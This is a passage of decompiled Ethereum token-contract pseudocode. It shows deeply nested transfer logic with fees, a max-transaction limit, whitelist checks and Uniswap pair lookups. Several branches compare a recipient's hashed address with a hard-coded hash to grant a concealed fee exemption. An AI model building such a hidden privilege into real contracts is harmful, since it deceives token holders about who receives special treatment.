                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7886 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7886 + 32 len mem[_7886]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        mem[0] = msg.sender
                        mem[32] = 16
                        if stor16[address(msg.sender)]:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7250 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7250 + 32 len mem[_7250]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(msg.sender)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            require ext_code.size(address(stor20.field_8))
                            staticcall address(stor20.field_8).factory() with:
                                    gas gas_remaining wei
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _7170 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _7188 = mem[_7170]
                            require mem[_7170] == mem[_7170 + 12 len 20]
                            require ext_code.size(address(stor20.field_8))
                            staticcall address(stor20.field_8).WETH() with:
                                    gas gas_remaining wei
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _7236 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _7271 = mem[_7236]
                            require mem[_7236] == mem[_7236 + 12 len 20]
                            mem[mem[64] + 4] = this.address
                            mem[mem[64] + 36] = address(_7271)
                            require ext_code.size(address(_7188))
                            staticcall address(_7188).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(_7271)
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _7443 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _7515 = mem[_7443]
                            require mem[_7443] == mem[_7443 + 12 len 20]
                            if mem[_7443 + 12 len 20] != msg.sender:
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[0] = arg1
                                    mem[32] = 16
                                    if stor16[address(arg1)]:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        mem[mem[64] + 32] = address(arg1)
                                        _7889 = mem[64]
                                        mem[mem[64]] = 20
                                        mem[64] = mem[64] + 52
                                        if sha3(mem[_7889 + 32 len mem[_7889]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if arg1 == this.address:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if msg.sender == address(_7515):
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if stor18:
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if not arg2:
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor19[stor19.length].field_256 = arg2
                                                            if arg2 < 0:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -1:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] += arg2
                                                            emit Transfer(arg2, msg.sender, arg1);
                                                        else:
                                                            if arg2 and _fee > -1 / arg2:
                                                                revert with 'NH{q', 17
                                                            if not arg2:
                                                                revert with 'NH{q', 18
                                                            if arg2 * _fee / arg2 != _fee:
                                                                revert with 0, 'SafeMath: multiplication overflow'
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor19[stor19.length].field_256 = arg2
                                                            if arg2 < arg2 * _fee / 100:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[0] += arg2 * _fee / 100
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                            emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                            if arg2 * _fee / 100 > 0:
                                                                emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                            else:
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[0] = arg1
                                    mem[32] = 16
                                    if stor16[address(arg1)]:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        mem[mem[64] + 32] = address(arg1)
                                        _7915 = mem[64]
                                        mem[mem[64]] = 20
                                        mem[64] = mem[64] + 52
                                        if sha3(mem[_7915 + 32 len mem[_7915]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if arg1 == this.address:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor16[address(arg1)]:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if stor18:
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if not arg2:
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(stor20.field_8))
